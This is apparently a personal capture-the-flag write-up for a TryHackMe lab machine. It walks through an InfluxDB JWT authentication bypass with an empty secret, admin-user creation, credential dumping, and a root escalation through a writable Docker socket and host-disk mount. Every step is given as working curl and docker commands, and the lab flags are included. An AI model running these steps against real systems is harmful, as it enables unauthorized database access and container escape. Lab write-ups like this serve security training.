# sweet_tooth 

> VOiD | Saturday 19 March 2022 03:41:22 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.202.140

## Rustscan 
```bash
PORT      STATE SERVICE      REASON
111/tcp   open  rpcbind      syn-ack
2222/tcp  open  EtherNetIP-1 syn-ack
8086/tcp  open  d-s-n        syn-ack
53100/tcp open  unknown      syn-ack
```

## PORT 8086 [Influx]
```bash

1.
Discover a user name in the system via the following URL:
    https://<influx-server-address>:8086/debug/requests

curl http://10.10.202.140:8086/debug/requests
{
"o5yY6yya:127.0.0.1": {"writes":2,"queries":2}
}


2.
Create a valid JWT token with this user, an empty secret, and a valid expiry date
You can use the following tool for creating the JWT: https://jwt.io/

header - {"alg": "HS256", "typ": "JWT"}
payload - {"username":"<input user name here>","exp":1548669066}
signature - HMACSHA256(base64UrlEncode(header) + "." +base64UrlEncode(payload),<leave this field empty>)

The expiry date is in the form of epoch time.


eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjk4NjY5MDY2fQ.qYaer_mS8M-yOpDOpHzuSPCrsXExFZpjj6HPPuHHAF8

3.
Authenticate to the server using the HTTP header:
Authorization: Bearer <The generated JWT token>

Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjk4NjY5MDY2fQ.qYaer_mS8M-yOpDOpHzuSPCrsXExFZpjj6HPPuHHAF8



curl -G "http://$IP/query?db=demodb" \
  --data-urlencode "q=SHOW DATABASES" \
  --header "Authorization: Bearer <JWT TOKEN HERE>"

curl -G "http://10.10.202.140:8086/query?db=demodb" \
  --data-urlencode "q=SHOW DATABASES" \
  --header "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjk4NjY5MDY2fQ.qYaer_mS8M-yOpDOpHzuSPCrsXExFZpjj6HPPuHHAF8" | jq

  "results": [
    {
      "statement_id": 0,
      "series": [
        {
          "name": "databases",
          "columns": [
            "name"
          ],
          "values": [
            [
              "creds"
            ],
            [
              "docker"
            ],
            [
              "tanks"
            ],
            [
              "mixer"
            ],
            [
              "_internal"
            ]
          ]
        }
      ]
    }
  ]
}
  
since we are admin we can add user to databases system

curl -G "http://10.10.202.140:8086/query" -X POST --data-urlencode "q=CREATE USER void WITH PASSWORD 'helloworld' WITH ALL PRIVILEGES" --header "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjk4NjY5MDY2fQ.qYaer_mS8M-yOpDOpHzuSPCrsXExFZpjj6HPPuHHAF8" | jq


influx -host '10.10.202.140' -port '8086' -username void -password helloworld
Connected to http://10.10.202.140:8086 version 1.3.0
InfluxDB shell version: 1.6.7~rc0
> show databases
name: databases
name
----
creds
docker
tanks
mixer
_internal

> show measurements
name: measurements
name
----
ssh


> show measurements
name: measurements
name
----
ssh

> select * from ssh
name: ssh
time                pw         user
----                --         ----
1621166400000000000 7788764472 uzJk6Ry98d8C

 ```

## USER [user  - docker]
```bash
uzJk6Ry98d8C@e414bd3d9731:~$ cat user.txt 
THM{V4w4FhBmtp4RFDti}

Docker socket /var/run/docker.sock is writable (https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket)


Writable Docker Socket
The docker socket is typically located at /var/run/docker.sock and is only writable by root user and docker group.
If for some reason you have write permissions over that socket you can escalate privileges.
The following commands can be used to escalate privileges:

docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash

./docker -H unix:///var/run/docker.sock run -it --privileged --pid=host sweettoothinc nsenter -t 1 -m -u -n -i sh


uploading local docker to container
uzJk6Ry98d8C@21dfad0b0eaf:/tmp/docker$ ./docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
sweettoothinc       latest              26a697c0d00f        10 months ago       359MB
influxdb            1.3.0               e1b5eda429c3        4 years ago         227MB

./docker -H tcp://localhost:8080 container exec sweettoothinc whoami
root

uzJk6Ry98d8C@21dfad0b0eaf:/tmp/docker$ ./docker -H tcp://localhost:8080 container exec sweettoothinc cat /root/root.txt
THM{5qsDivHdCi2oabwp}

uzJk6Ry98d8C@21dfad0b0eaf:/tmp/docker$ ./docker -H tcp://localhost:8080 container exec sweettoothinc bash /tmp/test.sh

root@21dfad0b0eaf:/# fdisk -l

Disk /dev/xvda: 16 GiB, 17179869184 bytes, 33554432 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xa8257195

Device     Boot    Start      End  Sectors  Size Id Type
/dev/xvda1 *        2048 32088063 32086016 15.3G 83 Linux
/dev/xvda2      32090110 33552383  1462274  714M  5 Extended
/dev/xvda5      32090112 33552383  1462272  714M 82 Linux swap / Solaris

root@21dfad0b0eaf:/mnt# mount /dev/xvda1 test/

root@21dfad0b0eaf:/mnt/test/root# cat root.txt 
THM{nY2ZahyFABAmjrnx}

```